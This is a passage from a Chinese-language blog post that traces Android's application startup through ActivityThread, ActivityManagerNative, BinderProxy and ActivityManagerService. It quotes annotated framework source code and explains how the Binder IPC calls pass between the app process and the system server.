class="hljs-params"></span>)</span> &#123;<br>                <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span> &#123;<br>                    <span class="hljs-keyword">if</span> (!mSomeActivitiesChanged) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    Runtime runtime = Runtime.getRuntime();<br>                    long dalvikMax = runtime.maxMemory();<br>                    long dalvikUsed = runtime.totalMemory() - runtime.freeMemory();<br>                    <span class="hljs-keyword">if</span> (dalvikUsed &gt; ((<span class="hljs-number">3</span>*dalvikMax)/<span class="hljs-number">4</span>)) &#123;<br>                        <span class="hljs-keyword">if</span> (DEBUG_MEMORY_TRIM) Slog.d(TAG, <span class="hljs-string">&quot;Dalvik max=&quot;</span> + (dalvikMax/<span class="hljs-number">1024</span>)<br>                                + <span class="hljs-string">&quot; total=&quot;</span> + (runtime.totalMemory()/<span class="hljs-number">1024</span>)<br>                                + <span class="hljs-string">&quot; used=&quot;</span> + (dalvikUsed/<span class="hljs-number">1024</span>));<br>                        mSomeActivitiesChanged = <span class="hljs-literal">false</span>;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//当已使用内存超过虚拟机总内存的3/4，就请求释放内存</span><br>                            mgr.releaseSomeActivities(mAppThread);<br>                        &#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;<br>                            <span class="hljs-keyword">throw</span> e.rethrowFromSystemServer();<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 不要在这里设置application，如果系统崩溃，我们没办法显示警告信息</span><br>            android.ddm.DdmHandleAppName.setAppName(<span class="hljs-string">&quot;system_process&quot;</span>,<br>                    UserHandle.myUserId());<br>            <span class="hljs-keyword">try</span> &#123;<br>                mInstrumentation = <span class="hljs-keyword">new</span> Instrumentation();<br>                ContextImpl context = ContextImpl.createAppContext(<br>                        <span class="hljs-built_in">this</span>, getSystemContext().mPackageInfo);<br>                mInitialApplication = context.mPackageInfo.makeApplication(<span class="hljs-literal">true</span>, <span class="hljs-literal">null</span>);<br>                mInitialApplication.onCreate();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(<br>                        <span class="hljs-string">&quot;Unable to instantiate Application():&quot;</span> + e.toString(), e);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//添加dropbox日志到libcore</span><br>        DropBox.setReporter(<span class="hljs-keyword">new</span> DropBoxReporter());<br><span class="hljs-comment">//添加Config回调接口</span><br>        ViewRootImpl.addConfigCallback(<span class="hljs-keyword">new</span> <span class="hljs-function"><span class="hljs-title">ComponentCallbacks2</span>(<span class="hljs-params"></span>)</span> &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">onConfigurationChanged</span>(<span class="hljs-params">Configuration newConfig</span>)</span> &#123;<br>                synchronized (mResourcesManager) &#123;<br>                    <span class="hljs-comment">// We need to apply this change to the resources</span><br>                    <span class="hljs-comment">// immediately, because upon returning the view</span><br>                    <span class="hljs-comment">// hierarchy will be informed about it.</span><br>                    <span class="hljs-keyword">if</span> (mResourcesManager.applyConfigurationToResourcesLocked(newConfig, <span class="hljs-literal">null</span>)) &#123;<br>                        updateLocaleListFromAppContext(mInitialApplication.getApplicationContext(),<br>                                mResourcesManager.getConfiguration().getLocales());<br><br>                        <span class="hljs-comment">// This actually changed the resources!  Tell</span><br>                        <span class="hljs-comment">// everyone about it.</span><br>                        <span class="hljs-keyword">if</span> (mPendingConfiguration == <span class="hljs-literal">null</span> ||<br>                                mPendingConfiguration.isOtherSeqNewer(newConfig)) &#123;<br>                            mPendingConfiguration = newConfig;<br><br>                            sendMessage(H.CONFIGURATION_CHANGED, newConfig);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">onLowMemory</span>(<span class="hljs-params"></span>)</span> &#123;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">onTrimMemory</span>(<span class="hljs-params">int level</span>)</span> &#123;<br>            &#125;<br>        &#125;);<br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>该方法的参数表明是否是system app调用，然后赋值mSystemThread；显然这里是普通app，进入第一个分支</li><li>接下来调用ensureJitEnabled()方法，目的是开启虚拟机即时编译功能，Jit全称Just-In-Time，JIT 是一种在运行时同步将字节码转化成机器码的编译器，Dalvik 直接运行转化后的机器码</li><li>通过ActivityManagerNative.getDefault()获取AMS的Binder代理对象，然后将APT对象发送给AMS，因为APT继承ATN，这样间接继承了IBinder接口，具备跨进程传输能力</li><li>通过BinderInternal类去观察虚拟机内存使用情况</li><li>添加dropbox日志到libcore</li><li>添加Config回调接口</li><li>接下来从ActivityManagerNative.getDefault()开始分析</li></ul><h4 id="4-4-2-AMN-getDefault"><a href="#4-4-2-AMN-getDefault" class="headerlink" title="4.4.2 AMN.getDefault()"></a>4.4.2 AMN.getDefault()</h4><p>源码位于frameworks/base/core/java/android/app/ActivityManagerNative.java</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取系统中全局的ActivityManager，这是与远程AMS通信的接口</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">public</span> IActivityManager <span class="hljs-title">getDefault</span>(<span class="hljs-params"></span>)</span> &#123;<br>        <span class="hljs-keyword">return</span> gDefault.<span class="hljs-keyword">get</span>();<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-title">Singleton</span>&lt;<span class="hljs-title">IActivityManager</span>&gt; gDefault</span> = <span class="hljs-keyword">new</span> Singleton&lt;IActivityManager&gt;() &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> IActivityManager <span class="hljs-title">create</span>(<span class="hljs-params"></span>)</span> &#123;<br>            IBinder b = ServiceManager.getService(<span class="hljs-string">&quot;activity&quot;</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span>) &#123;<br>                Log.v(<span class="hljs-string">&quot;ActivityManager&quot;</span>, <span class="hljs-string">&quot;default service binder = &quot;</span> + b);<br>            &#125;<br>            IActivityManager am = asInterface(b);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span>) &#123;<br>                Log.v(<span class="hljs-string">&quot;ActivityManager&quot;</span>, <span class="hljs-string">&quot;default service = &quot;</span> + am);<br>            &#125;<br>            <span class="hljs-keyword">return</span> am;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//将Binder对象转换成activity manager接口，并在需要时生成代理对象</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">public</span> IActivityManager <span class="hljs-title">asInterface</span>(<span class="hljs-params">IBinder obj</span>)</span> &#123;<br>        <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        IActivityManager <span class="hljs-keyword">in</span> =<br>            (IActivityManager)obj.queryLocalInterface(descriptor);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">in</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">//如果是同一个进程，那就直接返回ActivityManagerNative自己</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">in</span>;<br>        &#125;<br><span class="hljs-comment">//如果跨进程，那就将这个IBinder构建成代理对象返回</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ActivityManagerProxy(obj);<br>    &#125;<br></code></pre></td></tr></table></figure><p>当前应用所在进程与AMS所在的system server进程不是一个进程，如果想要与AMS通信，就必须要使用Binder机制，这里跨进程通信的过程就是一个典型的AIDL实现</p><p>这里是把ActivityThread当做Client，AMS当做Server，这里是跨进程，就需要获取AMS在Client的Binder代理对象，即构建AMP返回，所以这里的IActivityManager实质上是AMP对象，接下来进入AMP</p><h4 id="4-4-3-AMP-attachApplication"><a href="#4-4-3-AMP-attachApplication" class="headerlink" title="4.4.3 AMP.attachApplication()"></a>4.4.3 AMP.attachApplication()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public void attach<span class="hljs-constructor">Application(IApplicationThread <span class="hljs-params">app</span>)</span> throws RemoteException<br>    &#123;<br>    <span class="hljs-comment">//从Parcel池中获取Parcel对象（通讯载体），装载传递给AMS的数据</span><br>        Parcel data = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Parcel</span>.</span></span>obtain<span class="hljs-literal">()</span>;<br>        <span class="hljs-comment">//同上，不过是装载AMS返回的数据</span><br>        Parcel reply = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Parcel</span>.</span></span>obtain<span class="hljs-literal">()</span>;<br>        <span class="hljs-comment">//Binder唯一标志</span><br>        data.write<span class="hljs-constructor">InterfaceToken(IActivityManager.<span class="hljs-params">descriptor</span>)</span>;<br>        <span class="hljs-comment">//asBinder()方法是返回与IApplicationThread 接口相关联的Binder对象（Binder对象实际类型是ATN）</span><br>        data.write<span class="hljs-constructor">StrongBinder(<span class="hljs-params">app</span>.<span class="hljs-params">asBinder</span>()</span>);<br>        mRemote.transact(ATTACH_APPLICATION_TRANSACTION, data, reply, <span class="hljs-number">0</span>);<br>        reply.read<span class="hljs-constructor">Exception()</span>;<br>        data.recycle<span class="hljs-literal">()</span>;<br>        reply.recycle<span class="hljs-literal">()</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>因为是Binder代理对象，所以这里的mRemote是BinderProxy类型，进入看看</p><h4 id="4-4-4-BinderProxy-transact"><a href="#4-4-4-BinderProxy-transact" class="headerlink" title="4.4.4 BinderProxy.transact()"></a>4.4.4 BinderProxy.transact()</h4><p>源码位于 frameworks/base/core/java/android/os/Binder.java</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> code 每个AIDL函数都有一个编号，在跨进程的时候，不会传递函数，而是传递编号告诉Server调用哪个函数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> data Client要发送的数据</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> reply Server返回的数据</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> flags</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> RemoteException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">transact</span><span class="hljs-params">(<span class="hljs-keyword">int</span> code, Parcel data, Parcel reply, <span class="hljs-keyword">int</span> flags)</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;<br>        Binder.checkParcel(<span class="hljs-keyword">this</span>, code, data, <span class="hljs-string">&quot;Unreasonably large binder buffer&quot;</span>);<br>        <span class="hljs-keyword">if</span> (Binder.isTracingEnabled()) &#123; Binder.getTransactionTracker().addTrace(); &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">transactNative</span><span class="hljs-params">(code, data, reply, flags)</span></span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">boolean</span> transactNative(<span class="hljs-keyword">int</span> code, Parcel data, Parcel reply,<br>            <span class="hljs-keyword">int</span> flags) <span class="hljs-keyword">throws</span> RemoteException<br></code></pre></td></tr></table></figure><p>这里最终调用到了native层，接下来经过一系列函数调用，最终调用到了**talkWithDriver()*跟驱动交互，这个函数最后通过ioctl系统调用，Client进程陷入内核态，Client调用attachApplication方法的线程挂起等待返回；驱动完成一系列的操作之后唤醒AMS所在进程，调用了AMS所在进程本地对象的onTransact函数（实际上由Server端线程池完成），这里就调用了AMN的onTransact方法（AMN即Binder本地对象）</p><h4 id="4-4-5-AMN-onTransact"><a href="#4-4-5-AMN-onTransact" class="headerlink" title="4.4.5 AMN.onTransact()"></a>4.4.5 AMN.onTransact()</h4><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">onTransact</span><span class="hljs-params">(<span class="hljs-keyword">int</span> code, Parcel data, Parcel reply, <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> RemoteException </span>&#123;<br>        <span class="hljs-keyword">switch</span> (code) &#123;<br><span class="hljs-keyword">case</span> ATTACH_APPLICATION_TRANSACTION: &#123;<br>            data.enforceInterface(IActivityManager.descriptor);<br>            <span class="hljs-comment">//再将binder对象转换成接口(实际类型是ATP)</span><br>            IApplicationThread app = ApplicationThreadNative.asInterface(<br>                    data.readStrongBinder());<br>            <span class="hljs-keyword">if</span> (app != <span class="hljs-keyword">null</span>) &#123;<br>                attachApplication(app);<br>            &#125;<br>            reply.writeNoException();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.<span class="hljs-title">onTransact</span><span class="hljs-params">(code, data, reply, flags)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在AMS所在进程里面，onTransact根据编号调用相关函数；在这个例子里面，由AMS的Binder本地对象（AMN）调用了Server端的attachApplication方法，从这里开始就正式进入AMS了</p><p>这边很重要的一点是：<br>虽然在APP进程中是将APT作为参数发送给AMS所在进程，但是因为是跨进程，经过Binder驱动处理后，AMS接收到的是APT的代理对象，即ATP，然后作为参数传给了AMS.attachApplication</p><h4 id="4-4-6-AMS-attachApplication"><a href="#4-4-6-AMS-attachApplication" class="headerlink" title="4.4.6 AMS.attachApplication()"></a>4.4.6 AMS.attachApplication()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">@Override<br>   public final void attach<span class="hljs-constructor">Application(IApplicationThread <span class="hljs-params">thread</span>)</span> &#123;<br>       synchronized (this) &#123;<br>       <span class="hljs-comment">//获取正在attach的应用进程id</span><br>           <span class="hljs-built_in">int</span> callingPid = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Binder</span>.</span></span>get<span class="hljs-constructor">CallingPid()</span>;<br>           final long origId = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Binder</span>.</span></span>clear<span class="hljs-constructor">CallingIdentity()</span>;<br>           attach<span class="hljs-constructor">ApplicationLocked(<span class="hljs-params">thread</span>, <span class="hljs-params">callingPid</span>)</span>;<br>           <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Binder</span>.</span></span>restore<span class="hljs-constructor">CallingIdentity(<span class="hljs-params">origId</span>)</span>;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>这里的thread就是ATP了，AMS就用这个跟APP进程的APT通信<br>注意：这时候AMS所在进程作为Client，APP进程作为Server，记住一点，谁主动发起调用，谁就是Client端，你会发现这又是一个AIDL典型的实现</p><h4 id="4-4-7-AMS-attachApplicationLocked"><a href="#4-4-7-AMS-attachApplicationLocked" class="headerlink" title="4.4.7 AMS.attachApplicationLocked()"></a>4.4.7 AMS.attachApplicationLocked()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">boolean</span> attachApplicationLocked(IApplicationThread thread,<br>            <span class="hljs-keyword">int</span> pid) &#123;<br><br>        <span class="hljs-comment">// 通过pid查找正在attach的application record</span><br>        ProcessRecord app;<br>        <span class="hljs-keyword">if</span> (pid != MY_PID &amp;&amp; pid &gt;= <span class="hljs-number">0</span>) &#123;<br>            synchronized (mPidsSelfLocked) &#123;<br>                app = mPidsSelfLocked.get(pid);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            app = <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (app == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">//找不到对应的ProcessRecord，就杀掉pid对应的进程</span><br>            <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span> &amp;&amp; pid != MY_PID) &#123;<br>                Process.killProcessQuiet(pid);<br>                <span class="hljs-comment">//<span class="hljs-doctag">TODO:</span> killProcessGroup(app.info.uid, pid);</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//退出这个应用进程的Looper</span><br>                    thread.scheduleExit();<br>                &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> e) &#123;<br>                    <span class="hljs-comment">// Ignore exceptions.</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 第一次attach，app.thread应该为null</span><br>        <span class="hljs-comment">//如果不为null，说明attach在之前的进程，那就清除它</span><br>        <span class="hljs-keyword">if</span> (app.thread != <span class="hljs-literal">null</span>) &#123;<br>            handleAppDiedLocked(app, <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// 述说整个进程</span><br>        <br>        <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> processName = app.processName;<br>        <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//注册该进程的死亡回调</span><br>            AppDeathRecipient adr = <span class="hljs-keyword">new</span> AppDeathRecipient(<br>                    app, pid, thread);<br>            thread.asBinder().linkToDeath(adr, <span class="hljs-number">0</span>);<br>            app.deathRecipient = adr;<br>        &#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;<br>            app.resetPackageList(mProcessStats);<br>            startProcessLocked(app, <span class="hljs-string">&quot;link fail&quot;</span>, processName);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        EventLog.writeEvent(EventLogTags.AM_PROC_BOUND, app.userId, app.pid, app.processName);<br><br><span class="hljs-comment">//设置应用进程信息</span><br><br><span class="hljs-comment">//这一步结束，app.thread就不会为null</span><br>        app.makeActive(thread, mProcessStats);<br>        app.curAdj = app.setAdj = app.verifiedAdj = ProcessList.INVALID_ADJ;<br>        app.curSchedGroup = app.setSchedGroup = ProcessList.SCHED_GROUP_DEFAULT;<br>        app.forcingToForeground = <span class="hljs-literal">null</span>;<br>        updateProcessForegroundLocked(app, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>        app.hasShownUi = <span class="hljs-literal">false</span>;<br>        app.debugging = <span class="hljs-literal">false</span>;<br>        app.cached = <span class="hljs-literal">false</span>;<br>        app.killedByAm = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-comment">// 使用此标志来决定当用户在稍后解锁时是否需要安装provider</span><br>        app.unlocked = StorageManager.isUserKeyUnlocked(app.userId);<br><span class="hljs-comment">//移出进程启动超时消息</span><br>        mHandler.removeMessages(PROC_START_TIMEOUT_MSG, app);<br><br>        <span class="hljs-keyword">boolean</span> normalMode = mProcessesReady || isAllowedWhileBooting(app.info);<br>        <span class="hljs-keyword">List</span>&lt;ProviderInfo&gt; providers = normalMode ? generateApplicationProvidersLocked(app) : <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">//如果应用程序中存在正在启动的providers，那就延迟10s发送Contentprovider超时消息</span><br>        <span class="hljs-keyword">if</span> (providers != <span class="hljs-literal">null</span> &amp;&amp; checkAppInLaunchingProvidersLocked(app)) &#123;<br>            Message msg = mHandler.obtainMessage(CONTENT_PROVIDER_PUBLISH_TIMEOUT_MSG);<br>            msg.obj = app;<br>            mHandler.sendMessageDelayed(msg, CONTENT_PROVIDER_PUBLISH_TIMEOUT);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br><br><span class="hljs-comment">//获取ApplicationInfo。它保存了从AndroidManifest.xml中检索出的application标签下的信息</span><br>            ApplicationInfo appInfo = app.instrumentationInfo != <span class="hljs-literal">null</span><br>                    ? app.instrumentationInfo : app.info;<br>            app.compat = compatibilityInfoForPackageLocked(appInfo);<br>            <span class="hljs-keyword">if</span> (profileFd != <span class="hljs-literal">null</span>) &#123;<br>                profileFd = profileFd.dup();<br>            &#125;<br>            <span class="hljs-comment">//用于传递profiler设置的系统私有api</span><br>            ProfilerInfo profilerInfo = profileFile == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span><br>                    : <span class="hljs-keyword">new</span> ProfilerInfo(profileFile, profileFd, samplingInterval, profileAutoStop);<br>            <span class="hljs-comment">//绑定应用</span><br>            thread.bindApplication(processName, appInfo, providers, app.instrumentationClass,<br>                    profilerInfo, app.instrumentationArguments, app.instrumentationWatcher,<br>                    app.instrumentationUiAutomationConnection, testMode,<br>                    mBinderTransactionTrackingEnabled, enableTrackAllocation,<br>                    isRestrictedBackupMode || !normalMode, app.persistent,<br>                    <span class="hljs-keyword">new</span> Configuration(mConfiguration), app.compat,<br>                    getCommonServicesLocked(app.isolated),<br>                    mCoreSettingsObserver.getCoreSettingsLocked());<br>            <span class="hljs-comment">//更新进程lru列表</span><br>            updateLruProcessLocked(app, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);<br>            app.lastRequestedGc = app.lastLowMemory = SystemClock.uptimeMillis();<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> e) &#123;<br>            <span class="hljs-comment">// 如果bind失败，那就重启app进程，有可能会无限循环</span><br>            app.resetPackageList(mProcessStats);<br>            app.unlinkDeathRecipient();<br>            startProcessLocked(app, <span class="hljs-string">&quot;bind fail&quot;</span>, processName);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 从待启动应用列表清除这个ProcessRecord</span><br>        mPersistentStartingProcesses.remove(app);<br>        mProcessesOnHold.remove(app);<br><br>        <span class="hljs-keyword">boolean</span> badApp = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">boolean</span> didSomething = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-comment">// 检测最顶层的可见activity是否正在等待运行在这个进程（启动activity）</span><br>        <span class="hljs-keyword">if</span> (normalMode) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (mStackSupervisor.attachApplicationLocked(app)) &#123;<br>                    didSomething = <span class="hljs-literal">true</span>;<span class="hljs-comment">//didSomething表示是否有启动四大组件</span><br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> e) &#123;<br>                badApp = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 查找所有要运行在这个进程中的sevice</span><br>        <span class="hljs-keyword">if</span> (!badApp) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                